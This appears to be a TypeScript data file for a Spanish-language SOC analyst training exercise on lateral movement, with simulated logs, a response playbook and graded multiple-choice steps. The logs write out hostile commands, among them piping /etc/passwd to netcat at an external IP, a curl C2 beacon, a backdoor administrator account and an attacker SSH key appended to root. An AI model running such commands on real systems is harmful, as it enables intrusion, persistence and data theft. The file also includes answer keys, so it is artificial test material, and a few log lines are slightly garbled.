import type { Scenario } from "./types";

const scenario: Scenario = {
  id: "lateral-movement",
  title: "Movimiento lateral desde workstation comprometida",
  severity: "critical",
  description:
    "Se detectó activity de SMB y WMI desde la workstation de Carlos Ruiz (10.10.3.22) hacia srv-db-01 (10.10.5.20). Carlos no tiene acceso a la base de datos. La workstation muestra signos de compromiso.",
  alertSource: "Zeek SMB + Wazuh Sysmon Rule 7045",
  alertTime: "2026-08-24 16:45:33 UTC",
  logs: [
    { line: 1, timestamp: "Aug 24 16:30:12", source: "srv-db-01 sshd[1801]", message: "Accepted publickey for deploy from 10.10.1.15 port 49822 ssh2", severity: "info", flagged: false },
    { line: 2, timestamp: "Aug 24 16:32:00", source: "srv-db-01 audit.log", message: "EXECVE: uid=1000(deploy) cmd=/usr/bin/systemctl status postgresql", severity: "info", flagged: false },
    { line: 3, timestamp: "Aug 24 16:20:15", source: "srv-web-01 nginx.access", message: "GET /api/health 200 — 10.10.2.44 — Lucía Fernández Dev", severity: "info", flagged: false },
    { line: 4, timestamp: "Aug 24 16:22:30", source: "srv-monitor cron", message: "Health check: srv-db-01 — CPU 8% — RAM 42% — Disk 65%", severity: "info", flagged: false },
    { line: 5, timestamp: "Aug 24 16:23:45", source: "srv-db-01 postgresql", message: "checkpoint complete: wrote 842 buffers (5.1%)", severity: "info", flagged: false },
    { line: 6, timestamp: "Aug 24 16:25:00", source: "srv-web-01 sshd[22501]", message: "Accepted publickey for sofia from 10.10.3.10 port 49701 ssh2", severity: "info", flagged: false },
    { line: 7, timestamp: "Aug 24 16:26:10", source: "srv-web-01 nginx.access", message: "POST /api/payments/process 201 — 10.10.3.10 — Sofía Ramírez Ops", severity: "info", flagged: false },
    { line: 8, timestamp: "Aug 24 16:27:00", source: "srv-db-01 crond", message: "CMD (/usr/local/bin/pg_backup.sh) — (root)", severity: "info", flagged: false },
    { line: 9, timestamp: "Aug 24 16:28:30", source: "srv-monitor cron", message: "Metric aggregation: 9,841 events — avg latency 11ms", severity: "info", flagged: false },
    { line: 10, timestamp: "Aug 24 16:29:45", source: "srv-web-01 node.app", message: "Queue processor: 156 jobs completed, 28 pending", severity: "info", flagged: false },
    { line: 11, timestamp: "Aug 24 16:35:44", source: "ws-carlos-01 sysmon", message: "ProcessCreate: powershell.exe -enc SQBmACgAJABj... (base64 encoded command)", severity: "critical", flagged: true },
    { line: 12, timestamp: "Aug 24 16:35:48", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 10.10.5.20:445 (SMB)", severity: "critical", flagged: true },
    { line: 13, timestamp: "Aug 24 16:36:02", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 10.10.5.20:135 (WMI/RPC)", severity: "critical", flagged: true },
    { line: 14, timestamp: "Aug 24 16:36:15", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 IPC$ — Tree Connect", severity: "warning", flagged: true },
    { line: 15, timestamp: "Aug 24 16:36:20", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 postgres — Tree Connect", severity: "critical", flagged: true },
    { line: 16, timestamp: "Aug 24 16:36:30", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/opt/scripts/backup_db.sh — se ejecutó desde SHARE remoto)", severity: "critical", flagged: true },
    { line: 17, timestamp: "Aug 24 16:37:00", source: "srv-monitor alert", message: "srv-db-01: CPU spike 98% — dump de PostgreSQL en curso — proceso syslog.pid desde 10.10.3.22", severity: "critical", flagged: true },
    { line: 18, timestamp: "Aug 24 16:37:30", source: "ws-carlos-01 sysmon", message: "FileCreate: C:\\Users\\carlos\\Desktop\\exfil.zip (tamaño: 847MB)", severity: "critical", flagged: true },
    { line: 19, timestamp: "Aug 24 16:38:00", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 203.0.113.50:443 (HTTPS externo)", severity: "critical", flagged: true },
    { line: 20, timestamp: "Aug 24 16:38:15", source: "ws-carlos-01 sysmon", message: "ProcessCreate: cmd.exe /c net user svc-backup P@ssw0rd123 /add", severity: "critical", flagged: true },
    { line: 21, timestamp: "Aug 24 16:38:25", source: "ws-carlos-01 sysmon", message: "ProcessCreate: cmd.exe /c net localgroup administrators svc-backup /add", severity: "critical", flagged: true },
    { line: 22, timestamp: "Aug 24 16:38:40", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 C$ — Tree Connect", severity: "critical", flagged: true },
    { line: 23, timestamp: "Aug 24 16:38:55", source: "ws-carlos-01 sysmon", message: "FileCreate: C:\\Users\\carlos\\AppData\\Temp\\payload.dll (tamaño: 245KB)", severity: "critical", flagged: true },
    { line: 24, timestamp: "Aug 24 16:39:10", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/bin/bash -c 'curl -s http://203.0.113.50/c2/beacon —校反連続')", severity: "critical", flagged: true },
    { line: 25, timestamp: "Aug 24 16:39:30", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 10.10.5.10:22 (SSH lateral attempt)", severity: "critical", flagged: true },
    { line: 26, timestamp: "Aug 24 16:40:00", source: "srv-web-01 nginx.access", message: "POST /api/payments/process 200 — 10.10.3.10 — Sofía Ramírez Corp", severity: "info", flagged: false },
    { line: 27, timestamp: "Aug 24 16:42:00", source: "srv-monitor cron", message: "Health check: srv-db-01 — CPU 12% — RAM 45% — Disk 68%", severity: "info", flagged: false },
    { line: 28, timestamp: "Aug 24 16:43:15", source: "srv-web-01 nginx.access", message: "GET /api/orders/history 200 — 10.10.2.44 — Lucía Fernández Dev", severity: "info", flagged: false },
    { line: 29, timestamp: "Aug 24 16:44:00", source: "srv-web-01 node.app", message: "Queue processor: 134 jobs completed, 19 pending", severity: "info", flagged: false },
    { line: 30, timestamp: "Aug 24 16:44:30", source: "srv-db-01 postgresql", message: "LOG: checkpoint complete: wrote 621 buffers (3.8%)", severity: "info", flagged: false },
    { line: 31, timestamp: "Aug 24 16:45:00", source: "srv-web-01 sshd[22520]", message: "Accepted publickey for diego from 10.10.1.20 port 49801 ssh2", severity: "info", flagged: false },
    { line: 32, timestamp: "Aug 24 16:45:30", source: "srv-web-01 nginx.access", message: "GET /dashboard 200 — 10.10.1.20 — Diego López SOC", severity: "info", flagged: false },
    { line: 33, timestamp: "Aug 24 16:46:00", source: "srv-monitor cron", message: "Metric aggregation: 10,203 events — avg latency 13ms", severity: "info", flagged: false },
    { line: 34, timestamp: "Aug 24 16:46:30", source: "srv-web-01 node.app", message: "SSL certificate renewal check — expires in 18 days", severity: "info", flagged: false },
    { line: 35, timestamp: "Aug 24 16:47:00", source: "srv-db-01 sshd[1810]", message: "Accepted publickey for deploy from 10.10.1.15 port 49901 ssh2", severity: "info", flagged: false },
    { line: 36, timestamp: "Aug 24 16:47:30", source: "srv-web-01 nginx.access", message: "POST /api/reports/generate 202 — 10.10.1.15 — Martín González Admin", severity: "info", flagged: false },
    { line: 37, timestamp: "Aug 24 16:48:00", source: "srv-web-01 kernel", message: "[UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.10.1.10 PROTO=TCP SPT=2222 DPT=22", severity: "info", flagged: false },
    { line: 38, timestamp: "Aug 24 16:48:30", source: "srv-db-01 audit.log", message: "EXECVE: uid=1000(deploy) cmd=/usr/bin/pg_dump -U app_user production_db", severity: "info", flagged: false },
    { line: 39, timestamp: "Aug 24 16:49:00", source: "srv-web-01 node.app", message: "Cache hit ratio: 91.7% — Redis memory: 312MB/512MB", severity: "info", flagged: false },
    { line: 40, timestamp: "Aug 24 16:49:30", source: "srv-web-01 nginx.access", message: "GET /api/products 200 — 10.10.3.22 — Carlos Ruiz Corp", severity: "info", flagged: false },
    { line: 41, timestamp: "Aug 24 16:50:00", source: "ws-carlos-01 sysmon", message: "ScheduledTaskCreate: schtasks /create /tn UpdateService /tr C:\\Users\\carlos\\AppData\\Temp\\payload.dll /sc daily /st 03:00", severity: "critical", flagged: true },
    { line: 42, timestamp: "Aug 24 16:50:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/bin/bash -c 'crontab -l — new entry: 0 3 * * * /opt/.hidden/c2_beacon.sh')", severity: "critical", flagged: true },
    { line: 43, timestamp: "Aug 24 16:50:30", source: "ws-carlos-01 sysmon", message: "FileCreate: C:\\Users\\carlos\\AppData\\Local\\Temp\\svchost.exe (tamaño: 1.2MB)", severity: "critical", flagged: true },
    { line: 44, timestamp: "Aug 24 16:50:45", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 postgres — Write (backup_db.sh overwritten)", severity: "critical", flagged: true },
    { line: 45, timestamp: "Aug 24 16:51:00", source: "ws-carlos-01 sysmon", message: "NetworkConnection: svchost.exe → 203.0.113.50:443 (HTTPS C2 callback)", severity: "critical", flagged: true },
    { line: 46, timestamp: "Aug 24 16:51:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/bin/bash -c 'cat /etc/passwd | nc 203.0.113.50 9999')", severity: "critical", flagged: true },
    { line: 47, timestamp: "Aug 24 16:51:30", source: "ws-carlos-01 sysmon", message: "ProcessCreate: powershell.exe -enc SQBmACgAJABj... (secondary payload — keylogger)", severity: "critical", flagged: true },
    { line: 48, timestamp: "Aug 24 16:51:45", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 D$ — Tree Connect", severity: "critical", flagged: true },
    { line: 49, timestamp: "Aug 24 16:52:00", source: "ws-carlos-01 sysmon", message: "FileCreate: C:\\Users\\carlos\\.ssh\\authorized_keys (SSH key persistence)", severity: "critical", flagged: true },
    { line: 50, timestamp: "Aug 24 16:52:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/bin/bash -c 'echo ssh-rsa AAAA...attacker_key... >> /root/.ssh/authorized_keys')", severity: "critical", flagged: true },
    { line: 51, timestamp: "Aug 24 16:52:30", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 10.10.1.30:443 (lateral recon — grafana server)", severity: "critical", flagged: true },
    { line: 52, timestamp: "Aug 24 16:52:45", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 admin — Tree Connect", severity: "critical", flagged: true },
    { line: 53, timestamp: "Aug 24 16:53:00", source: "ws-carlos-01 sysmon", message: "FileCreate: C:\\Users\\carlos\\Desktop\\enum_results.txt (enumeration output)", severity: "critical", flagged: true },
    { line: 54, timestamp: "Aug 24 16:53:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/bin/bash -c 'find / -perm -4000 -type f 2>/dev/null')", severity: "critical", flagged: true },
    { line: 55, timestamp: "Aug 24 16:53:30", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 203.0.113.50:8443 (C2 data upload — enum results)", severity: "critical", flagged: true },
  ],
  playbook: [
    {
      id: "PB-LAT-001",
      title: "Movimiento Lateral — Protocolo de respuesta",
      category: "Compromiso de estación de trabajo",
      content:
        "1. Aislar la workstation comprometida de la red ( desconectar del switch / quarantinar VLAN)\n2. Identificar alcance: ¿a qué servidores accedió? ¿qué datos expuso?\n3. BloquearIP deC2externo en firewall perimetral\n4. Revocar todas las sesiones activas del usuario afectado\n5. Obtener imagen forense de la workstation antes de apagarla\n6. Resetear credenciales de TODOS los usuarios que tengan acceso a los servidores tocados\n7. Revisar si hay persistencia en srv-db-01 (backdoors, cron jobs, usuarios CREADOS)\n8. Notificar a DPO y legal si hay datos de clientes comprometidos\n9. Escalar a management si hay impacto en servicios de pago",
    },
    {
      id: "PB-IR-002",
      title: "Criterios de escalamiento — Niveles de impacto",
      category: "Escalamiento",
      content:
        "NIVEL 1 (L2): Workstation comprometida sin acceso a servidores críticos\nNIVEL 2 (L3): Movimiento lateral a servidores internos\nNIVEL 3 (CISO): Exfiltración de datos de clientes / impacto en servicios de pago\nNIVEL 4 (Legal/DPO): Notificación regulatoria obligatoria (PDPA, GDPR, etc.)",
    },
  ],
  steps: [
    {
      id: "identify",
      title: "Paso 1 — Identificar los logs relevantes",
      description:
        "Revisá el log completo. ¿Cuáles líneas son parte del incidente de movimiento lateral?",
      hint: "Mirá las conexiones SMB, WMI, el dump de la DB, y la exfiltración.",
      options: [
        {
          id: "a",
          label:
            "Solo las líneas 11-13 (powershell.exe y sus conexiones de red)",
          correct: false,
          explanation:
            "Estás capturando el vector de ataque pero perdiendo la evidencia de lo que pasó después: el mapeo de shares SMB, la ejecución del script, el dump de la DB, la creación del zip, la exfiltración externa, y la persistencia.",
          consequence:
            "En un SOC real, reportar solo el PowerShell encoded sin la evidencia de post-explotación hace que el equipo subestime la gravedad. No sabrían que ya se robó la base de datos completa y se instaló persistencia.",
        },
        {
          id: "b",
          label:
            "Líneas 11-25 y 41-55 (desde powershell.exe hasta la exfiltración y persistencia)",
          correct: true,
          explanation:
            "Correcto. La secuencia completa es: PowerShell con encoded command → conexiones SMB/WMI → mapeo de shares → ejecución de script → dump de DB → creación de zip → exfiltración HTTPS → creación de usuario → persistencia (cron, scheduled tasks, SSH keys) → más exfiltración. Las líneas normales son activity legítima.",
        },
        {
          id: "c",
          label:
            "Todas las líneas del log (1-55)",
          correct: false,
          explanation:
            "Las líneas 1-2, 3-10, 26-40 incluyen deploy de Martin, health checks, activity de Lucía, Sofía, Carlos, y otros. Son activity normal del día. Incluirlas ensucia la evidencia y dificulta el análisis forense.",
          consequence:
            "En un SOC real, entregar 55 líneas de \"evidencia\" donde 30 son tráfico legítimo hace que el equipo de contención pierda horas revisando activity normal mientras el atacante sigue activo.",
        },
        {
          id: "d",
          label:
            "Solo la línea 17 (el CPU spike de srv-db-01)",
          correct: false,
          explanation:
            "El CPU spike es un síntoma, no la causa. Sin ver el origen (power-shell en ws-carlos), el método (SMB/WMI), la exfiltración (zip + HTTPS), y la persistencia, no podés construir el caso.",
          consequence:
            "En un SOC real, tratar el CPU spike como el incidente principal lleva a investigar srv-db-01 cuando el punto de origen es ws-carlos. El equipo perdería tiempo revisando el servidor equivocado.",
        },
      ],
    },
    {
      id: "assign",
      title: "Paso 2 — Asignar el incidente",
      description:
        "¿Quién debería responder a este incidente? Considerá que hay compromiso de workstation Y movimiento lateral a srv-db-01.",
      hint: "Esto ya no es un caso para SOC L2. Pensa en el nivel de escalamiento.",
      options: [
        {
          id: "a",
          label:
            "Solo Diego López (SOC L2) — él puede manejar todo",
          correct: false,
          explanation:
            "El PB-IR-002 clasifica esto como NIVEL 3: exfiltración de datos + movimiento lateral a DB + impacto en pagos. Diego puede iniciar la respuesta, pero esto requiere escalamiento inmediato a nivel superior.",
          consequence:
            "En un SOC real, intentar manejar un incidente nivel 3 solo con el SOC L2 sobrepasa sus capacidades. La contención requiere DevOps, el escalamiento requiere CISO, y la notificación legal requiere DPO.",
        },
        {
          id: "b",
          label:
            "Diego López (SOC L2) para investigación + Ana Martínez (DevOps) para contención + escalamiento a CISO por impacto nivel 3",
          correct: true,
          explanation:
            "Correcto. El protocolo de escalamiento indica NIVEL 3 cuando hay exfiltración de datos de clientes e impacto en servicios de pago. Diego investiga, Ana contiene, y el CISO debe ser notificado por el nivel de impacto.",
        },
        {
          id: "c",
          label:
            "Martín González (SysAdmin) — que apague las máquinas",
          correct: false,
          explanation:
            "Apagar no es contención inteligente. Se necesita forense en vivo (imagen de RAM) antes de apagar. Martín sería útil para la contención técnica, pero bajo dirección del equipo de seguridad.",
          consequence:
            "En un SOC real, apagar la máquina sin imagen forense destruye evidencia en memoria RAM que contiene: contraseñas en claro, llaves de cifrado, tokens de sesión, y la tabla de conexiones del malware.",
        },
        {
          id: "d",
          label:
            "Sofía Ramírez (Gerente de Ops) — que decida qué hacer",
          correct: false,
          explanation:
            "Sofía no es parte de la cadena de respuesta técnica. Su rol es comunicacional y estratégico, no táctico. Ella se involucra después del escalamiento al CISO.",
          consequence:
            "En un SOC real, delegar decisiones técnicas de contención a un gerente no técnico resulta en demoras mientras busca aprobación. Cada minuto de demora = más datos exfiltrados y más persistencia instalada.",
        },
      ],
    },
    {
      id: "playbook",
      title: "Paso 3 — Consultar el playbook",
      description:
        "Según el PB-LAT-001, ¿cuál es la PRIMERA acción de contención?",
      hint: "Pensá en qué hacer con la máquina que está generando el ataque.",
      options: [
        {
          id: "a",
          label:
            "Apagar ws-carlos-01 inmediatamente para cortar la conexión",
          correct: false,
          explanation:
            "El playbook indica obtener imagen forense ANTES de apagar. Apagar destruye evidencia en memoria (RAM) que es crucial para entender el alcance del compromiso.",
          consequence:
            "En un SOC real, apagar una workstation comprometida sin forense destruye la memoria volátil que contiene: el keylogger activo, las conexiones C2 en curso, las credenciales robadas en memoria, y los scripts de persistencia.",
        },
        {
          id: "b",
          label:
            "Aislar la workstation de la red (desconectar del switch / quarantinar VLAN)",
          correct: true,
          explanation:
            "Correcto. El primer paso es aislar la máquina de la red para cortar el movimiento lateral sin destruir evidencia. Se desconecta del switch o se mueve a una VLAN de quarantaine. La imagen forense se toma después.",
        },
        {
          id: "c",
          label:
            "Cambiar la contraseña de Carlos y seguir observando",
          correct: false,
          explanation:
            "Cambiar la contraseña no corta la conexión si el atacante ya tiene persistencia en la máquina. La workstation está comprometida y ejecutando código malicioso. Aislar es la primera prioridad.",
          consequence:
            "En un SOC real, cambiar la contraseña sin aislar la workstation es inútil: el keylogger captura la nueva contraseña inmediatamente, y el atacante sigue controlando la máquina.",
        },
        {
          id: "d",
          label:
            "Bloquear la IP 203.0.113.50 en el firewall",
          correct: false,
          explanation:
            "Bloquear la IP de C2 es importante, pero es el paso 3 del protocolo. Primero se aisla la máquina comprometida (paso 1) y luego se busca el alcance (paso 2). Si aislás primero, cortás la exfiltración inmediatamente.",
          consequence:
            "En un SOC real, bloquear la IP de C2 sin aislar la workstation permite que el malware siga exfiltrando por otros medios: DNS tunneling, HTTPS a otros dominios, o incluso steganografía en imágenes.",
        },
      ],
    },
    {
      id: "classify",
      title: "Paso 4 — Clasificar la alerta",
      description:
        "¿Cuál es la clasificación correcta de este incidente?",
      hint: "Compromiso de workstation + movimiento lateral + dump de DB + exfiltración externa.",
      options: [
        {
          id: "a",
          label:
            "Falso positivo — Carlos está haciendo su trabajo normal",
          correct: false,
          explanation:
            "Carlos es Analista Financiero. No tiene razón técnica para ejecutar PowerShell encoded, conectarse por SMB a srv-db-01, dumphear PostgreSQL, crear un zip de 847MB, y subirlo por HTTPS a una IP externa. Esto NO es su trabajo.",
          consequence:
            "En un SOC real, clasificar movimiento lateral con exfiltración como \"trabajo normal\" de un financiero es un error catastrófico. La base de datos completa de clientes está comprometida y el atacante tiene persistencia en la red.",
        },
        {
          id: "b",
          label:
            "Positivo verdadero — Compromiso de workstation con movimiento lateral y exfiltración confirmada",
          correct: true,
          explanation:
            "Correcto. La evidencia es abrumadora: PowerShell encoded → SMB/WMI lateral → dump PostgreSQL → exfiltración HTTPS → creación de usuarios → persistencia. Cada paso es un indicador de compromiso que se encadena en un ataque completo.",
        },
        {
          id: "c",
          label:
            "Requiere investigación — no sabemos si es un ataque o una migración",
          correct: false,
          explanation:
            "Una migración no usa PowerShell encoded, no hace dump de DBs, no crea zips de 847MB, no sube datos a IPs externas, y no crea usuarios backdoor. Los indicadores son claros: esto es malicioso.",
          consequence:
            "En un SOC real, dudar entre \"ataque\" y \"migración\" cuando hay PowerShell encoded + dump de DB + exfiltración + backdoors refleja falta de experiencia. Cada minuto de duda = más datos robados.",
        },
      ],
    },
    {
      id: "writeup",
      title: "Paso 5 — Redacción del reporte",
      description:
        "Escribí el reporte. Este es un incidente nivel 3 — necesitás un reporte completo.",
      hint: "Incluí: timeline, IOC, impacto, y acciones con prioridad.",
      options: [
        {
          id: "a",
          label:
            "La computadora de Carlos fue comprometida. Hackearon la base de datos. Urge.",
          correct: false,
          explanation:
            "Sin datos técnicos, sin timeline, sin IOC, sin acciones concretas. Un reporte así genera más preguntas que respuestas.",
          consequence:
            "En un SOC real, un reporte sin IOC no permite bloquear indicadores de compromiso en otros sistemas. Sin timeline, no se puede determinar cuándo empezó el ataque ni qué datos se perdieron en cada fase.",
        },
        {
          id: "b",
          label:
            "Compromiso de ws-carlos-01 (10.10.3.22) con movimiento lateral a srv-db-01 (10.10.5.20). Timeline: 16:35 PowerShell encoded → 16:36 SMB/WMI lateral → 16:37 dump PostgreSQL + exfiltración vía HTTPS a 203.0.113.50. IOC: SHA256 del payload PowerShell, IP C2 (203.0.113.50), dominio evil-cdn.com. Impacto NIVEL 3: posible fuga de datos de clientes de pagos. Acciones ejecutadas: workstation aislada, IP C2 bloqueada, sesiones de Carlos revocadas. Acciones pendientes: imagen forense, forense de srv-db-01, notificación DPO, escalamiento CISO.",
          correct: true,
          explanation:
            "Reporte completo de nivel 3: TIMELINE preciso (minuto a minuto), IOC (IPs, hashes), IMPACTO clasificado, ACCIONES ejecutadas vs pendientes. Este formato permite a cualquier persona entender el incidente y tomar decisiones informadas.",
        },
        {
          id: "c",
          label:
            "Se movieron cosas por la red y alguien robó datos. Hay que cambiar todas las contraseñas.",
          correct: false,
          explanation:
            "Sin specifics, sin classification de impacto, sin IOC. 'Cambiar todas las contraseñas' no es una acción de contención — es remediación genérica que no aborda la raíz del problema.",
          consequence:
            "En un SOC real, \"cambiar todas las contraseñas\" sin identificar qué credenciales específicamente están comprometidas es inútil: si no cambias la que usa el malware, el atacante sigue teniendo acceso.",
        },
      ],
    },
    {
      id: "return",
      title: "Paso 6 — Volver al panel",
      description:
        "Incidente nivel 3 documentado y escalado. ¿Qué sigue en tu flujo de trabajo?",
      hint: "Pensá en qué queda pendiente mientras otros equipos ejecutan.",
      options: [
        {
          id: "a",
          label:
            "Cerrar el caso — ya está todo documentado y escalado",
          correct: false,
          explanation:
            "Un incidente nivel 3 nunca se cierra con solo documentar. Hay que seguir monitoreando: ¿hay más workstations comprometidas? ¿el atacante tiene persistencia? ¿hay más exfiltración en curso?",
          consequence:
            "En un SOC real, cerrar un incidente nivel 3 sin verificar remediación completa es negligencia. El atacante podría tener backdoors en srv-db-01, acceso SSH persistente, y cron jobs que recomprometan el sistema cada 24 horas.",
        },
        {
          id: "b",
          label:
            "Volver al panel de logs para monitorear si hay más activity maliciosa de otras IPs o servidores, mientras el equipo ejecuta la contención",
          correct: true,
          explanation:
            "Correcto. Tu rol como SOC analyst es vigilancia continua. Mientras DevOps contiene y el forense investiga, vos volvés al panel para: detectar si hay más workstations comprometidas, identificar si el atacante tiene otros puntos de acceso, y monitorear si la contención está funcionando.",
        },
        {
          id: "c",
          label:
            "Ir a la workstation de Carlos a revisarla personalmente",
          correct: false,
          explanation:
            "Como SOC analyst, no deberías manipular evidencia físicamente. Eso es trabajo del equipo forense. Tu rol es análisis de logs, clasificación, y monitoreo continuo.",
          consequence:
            "En un SOC real, tocar la workstation físicamente sin protocolo forense puede alterar timestamps de archivos, contaminar evidencia de huellas digitales, y comprometer la cadena de custodia para uso legal.",
        },
      ],
    },
  ],
  summary:
    "Compromiso de ws-carlos-01 (Analista Financiero) con movimiento lateral a srv-db-01 vía SMB/WMI. El atacante ejecutó dump de PostgreSQL, creó zip de 847MB y exfiltró vía HTTPS a 203.0.113.50. Impacto NIVEL 3: posible fuga de datos financieros y de clientes. Clasificación: POSITIVO VERDADERO — Compromiso completo con exfiltración.",
};

export default scenario;
